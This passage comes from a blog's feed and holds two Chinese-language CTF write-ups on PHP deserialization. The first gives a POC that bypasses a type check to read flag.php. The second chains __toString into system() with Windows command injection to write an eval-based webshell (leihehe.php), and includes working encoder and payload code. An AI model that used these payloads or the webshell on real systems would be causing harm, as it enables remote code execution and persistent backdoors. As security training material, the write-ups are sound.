class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;<span class="comment">//若当前filename有值，读取该filename</span></span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)<span class="comment">//如果op的大小为2，且类型为string,将其转化为1</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();<span class="comment">//执行process()</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;<span class="comment">//对反序列化字段%00有检测</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有一个<code>include(&quot;flag.php&quot;);</code>，我们猜测flag应该就是中<code>flag.php</code>中</p>
<p>可以发现，最后一段<code>unserialize()</code>里的参数是来源于<code>Get请求中的str参数</code>，那么我们可以发送<code>GET请求</code>来执行反序列化操作。</p>
<p>有了<code>unserialize()</code>函数，我们还需要一个有可利用的魔法函数的Class。很明显，我们可以看到上面有一个<code>class FileHandler</code>，通过观察，他有<code>_destruct()</code>方法，且方法中执行了<code>process()</code>函数。再分析<code>process()</code>函数可以发现它在对<code>op</code>的值进行判断。若op=2,我们就可以读取我们想要的文件了！</p>
<p>因为在<code>_destruct()</code>中，判断<code>op</code>是用的<code>===</code>，即要求变量类型和数值都得一样，所以我们可以把<code>op</code>写成<code>op=2</code>，这样因为不是String类型，就不会被检测了，最终可以绕过该检测。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)<span class="comment">//如果op的大小为2，且类型为string,将其转化为1</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>另外<code>is_valid()</code>对反序列化字段%00有检测，如果我们用<code>protected</code>类型的<code>attribute</code>写POC是无法绕过的，</p>
<blockquote>
<p>php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可</p>
</blockquote>
<p>所以我们可以把<code>attribute</code>都改成<code>public</code> </p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$o</span>);</span><br></pre></td></tr></table></figure>

<p>生成出来的序列化数据用get形式发给网址</p>
<p><img src="/image/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-Write-up/image-20210715142703979.png" alt="image-20210715142703979"></p>
<p>可以看到<code>result</code>已经有了，右键查看源代码即可得到<code>flag</code></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>之前一直没搞清楚 <code>__construct()</code>的触发机制，<code>__construct()</code>在执行<code>unserialize()</code>时是不会被触发的。</p>
<p>主要是两个坑点：</p>
<ul>
<li><p><code>is_valid()</code>导致<code>%00</code>无法写入 -&gt; <strong>php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可</strong></p>
</li>
<li><p><code>php</code>的<code>===</code>和<code>==</code>的区别：</p>
<blockquote>
<ul>
<li>用<strong>三个等号</strong>时，除了两<strong>个</strong>变量的值相同外，还必须这两<strong>个</strong>变量的类型相同，才能输出true，否则输出false</li>
</ul>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Write-up</tag>
        <tag>PHP Deserialization</tag>
      </tags>
  </entry>
  <entry>
    <title>记某CTF赛题PHP反序列化漏洞解题过程</title>
    <url>/2021/07/23/%E8%AE%B0%E6%9F%90CTF%E8%B5%9B%E9%A2%98PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天在群里看见有人发了一个CTF赛题，看了下是PHP反序列化类型的，出于好奇便做了一下，途中遇到一些坑，最后终于解决了，同时我也收获了一些自己平时没有注意过、了解掌握过的知识，因此将这个解题思路和过程记录下来，方便以后复习。</p>
<h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><h2 id="确定漏洞类型"><a href="#确定漏洞类型" class="headerlink" title="确定漏洞类型"></a>确定漏洞类型</h2><p>因为代码是直接发在群里的，我把它手动复制粘贴到了PHP文件里，方便操作。</p>
<span id="more"></span>

<p>首先看下源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contents</span> = <span class="string">&quot;hello ctfer&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z]/i&#x27;</span>,<span class="variable">$this</span>-&gt;contents))) &#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo <span class="subst">$this</span>-&gt;contents&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;...&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode_data</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$res</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$data</span> =<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">decode_data</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析代码可知，第28号处有<code>unserialize()</code>，这意味着这道题是PHP反序列化漏洞的题且我们需要传入一个携带<code>data</code>参数的GET请求。</p>
<h2 id="确定利用的Class"><a href="#确定利用的Class" class="headerlink" title="确定利用的Class"></a>确定利用的Class</h2><p>那么这里有什么可以被我们用来利用的类吗？这时我看到了<code>class A</code>，发现如下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z]/i&#x27;</span>,<span class="variable">$this</span>-&gt;contents))) &#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo <span class="subst">$this</span>-&gt;contents&quot;</span>);<span class="comment">//此处高亮！！发现了命令执行代码</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;...&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>Class A</code>中，有一个<code>toString()</code>的方法，方法内部有我们想要的命令执行代码。</p>
<p>我们知道当Object与字符串比较或被执行与字符串相关操作的时候，<code>__toString()</code>会被call。继续看，<code>$data</code>会被执行<code>decode_data($data)</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode_data</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>); <span class="variable">$i</span>++)&#123;<span class="comment">//此处data被取了strlen,所以to_String()是会被call的</span></span><br><span class="line">        <span class="variable">$res</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重点来了，<code>strlen($data)</code>代表着<code>$data</code>最终是会被执行<code>__toString()</code>的，那么我们更加确信，<code>Class A</code> <strong>可以被我们利用实现反序列化</strong>。</p>
<h2 id="构造利用Class"><a href="#构造利用Class" class="headerlink" title="构造利用Class"></a>构造利用Class</h2><p>在<code>__toString()</code>方法中，我们必须满足 <code>if ((preg_match(&#39;/^[a-z]/i&#39;,$this-&gt;contents)))</code>，才能执行<code>system()</code>命令。</p>
<p>来看下<code>preg_match()</code>解释</p>
<p><img src="/image/%E8%AE%B0%E6%9F%90CTF%E8%B5%9B%E9%A2%98PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210723150712496.png" alt="image-20210723150712496"></p>
<p>由此可知，<code>preg_match()</code>在第一次匹配到结果后，就结束匹配了。那么我们可以把代码理解为如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="comment">//从变量contents的开头第一个字符开始，到最后一个字符，匹配是否为a-z的字母，如果结果为真，进入下面的代码，否则进入else&#123;&#125;</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z]/i&#x27;</span>,<span class="variable">$this</span>-&gt;contents))) &#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo <span class="subst">$this</span>-&gt;contents&quot;</span>);<span class="comment">//命令执行</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;...&quot;</span>;<span class="comment">//未匹配到</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>举个例子，如果我们<code>$contents=&quot;&lt;?php phpinfo() ?&gt;&quot;</code>,<code>preg_match()</code>就会匹配失败，因为我们第一个字符不是字母<code>a-z</code>。但如果我们的<code>contents=&quot;a&lt;?php phpinfo() ?&gt;&quot;</code>，这时候<code>preg_match()</code>匹配到第一个字符为a，符合条件，于是不再继续检测，返回<code>true</code>。</p>
<p>观察 <code>system(&quot;echo $this-&gt;contents&quot;);</code>中有一个<code>echo</code>，是输出的意思。因为我是在<code>windows</code>的环境上搭建的，所以我们需要用<code>windows</code>的<code>DOS</code>命令。这时我想到了使用<code>&amp;</code>来执行多条命令，所以</p>
<p>因此我们可以构造<code>$contents=&#39;a &amp; echo ^&lt;^?php ^@eval(^$_POST[&quot;leihehe&quot;]);^?^&gt; &gt;&gt;leihehe.php&#39;</code>将一句话木马写入<code>leihehe.php</code>文件中</p>
<p>注意在符号前要加上转义符<code>^</code>，否则无法输出：</p>
<p><img src="/image/%E8%AE%B0%E6%9F%90CTF%E8%B5%9B%E9%A2%98PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210723152016246.png" alt="image-20210723152016246"></p>
<p>还有要注意单引号和双引号的问题，PHP中给变量赋值的时候，用双引号会把一些符号给翻译成PHP语言，所以我们这种符号比较多的情况，要用单引号，<code>$_POST[&quot;leihehe&quot;]</code>里面的内容用双引号。</p>
<p>这样我们的<code>Class A</code>就构造好了。</p>
<h2 id="序列化及加密（逆向思维）"><a href="#序列化及加密（逆向思维）" class="headerlink" title="序列化及加密（逆向思维）"></a>序列化及加密（逆向思维）</h2><p>那么我们应该怎么把他序列化呢？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode_data</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$res</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$data</span> =<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">decode_data</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过观察，data被传入后会进行自定义的解码，最后再被反序列化。反过来，我们需要先序列化后，再按照它自定义的方式编码。</p>
<p>来看看他是如何解码的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode_data</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>);<span class="comment">//base64解码</span></span><br><span class="line">    <span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>); <span class="variable">$i</span>++)&#123;<span class="comment">//将base64解码后的每一个字符都用ord转换成ASCII后，加上它所在的index，再用chr()转换回字符。</span></span><br><span class="line">        <span class="variable">$res</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么他的处理过程是：</p>
<p>data-&gt;base64解码-&gt;chr(ord($data)+$i)-&gt;反序列化</p>
<p>反过来，我们构造的过程可以是：</p>
<p>序列化-&gt;<code>chr(ord($data)-$i)</code>-&gt;base64加密-&gt;data</p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class A</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contents</span> = <span class="string">&#x27;a &amp; echo ^&lt;^?php ^@eval(^$_POST[&quot;leihehe&quot;]);^?^&gt; &gt;&gt;leihehe.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$af</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>());<span class="comment">//序列化</span></span><br><span class="line"><span class="variable">$res</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$af</span>); <span class="variable">$i</span>++)&#123;<span class="comment">//自定义编码过程</span></span><br><span class="line">    <span class="variable">$res</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$af</span>[<span class="variable">$i</span>]) - <span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$res</span>);<span class="comment">//base64编码后输出</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/image/%E8%AE%B0%E6%9F%90CTF%E8%B5%9B%E9%A2%98PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210723163609369.png" alt="image-20210723163609369"></p>
<p>赋值给$data：</p>
<p><img src="/image/%E8%AE%B0%E6%9F%90CTF%E8%B5%9B%E9%A2%98PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210723163906677.png" alt="image-20210723163906677"></p>
<p>可见输出了<code>111</code>,这时候我们可以看到目录下已经生成了<code>php</code>文件</p>
<p><img src="/image/%E8%AE%B0%E6%9F%90CTF%E8%B5%9B%E9%A2%98PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210723164057370.png" alt="image-20210723164057370"></p>
<p>连接菜刀即可 - 不知道为什么我的菜刀连接不上，所以直接用浏览器演示好了</p>
<p><img src="/image/%E8%AE%B0%E6%9F%90CTF%E8%B5%9B%E9%A2%98PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210723164934353.png" alt="image-20210723164934353"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题我花了很长时间，主要是在以下坑点一直stuck:</p>
<ul>
<li>没有弄清楚题目中自定义解码的过程，导致写不出来逆向的加密过程。<code>ord()</code>和<code>chr()</code>不明白什么意思。<code>ord()</code>是返回字符串第一个字符的<code>ASCII</code>值，<code>chr()</code>是把<strong>ASCII值转换为字符</strong>。</li>
<li>因为不了解<code>preg_match()</code>函数，误认为是检测所有字符，导致在这里卡了很久（自己还不知道去查一下资料..）。<code>preg_match()</code>函数在<strong>匹配到第一个符合的字节后就会停止匹配</strong>。</li>
<li>对<code>Windows</code>下命令行的操作命令不熟悉，又加上不清楚<code>preg_match()</code>方法，导致我以为整个<code>variable</code>完全不能含有特殊符号，一直在想怎么绕过。<strong>Windows下，特殊符号前面需要加转义符^</strong>。</li>
<li>不知道有<code>echo 111 &gt;&gt;1.php</code>这种输出文件的写法。</li>
</ul>
<p>总之这次收获很多，果然是要多做练习才能增加实力。</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://stackoverflow.com/questions/4088836/php-preg-match-and-preg-match-all-functions">PHP preg_match and preg_match_all functions</a></p>
<p><a href="https://zhidao.baidu.com/question/684831621725683492.html">关于批处理转义特殊字符</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Write-up</tag>
        <tag>PHP Deserialization</tag>
      </tags>
  </entry>
</search>
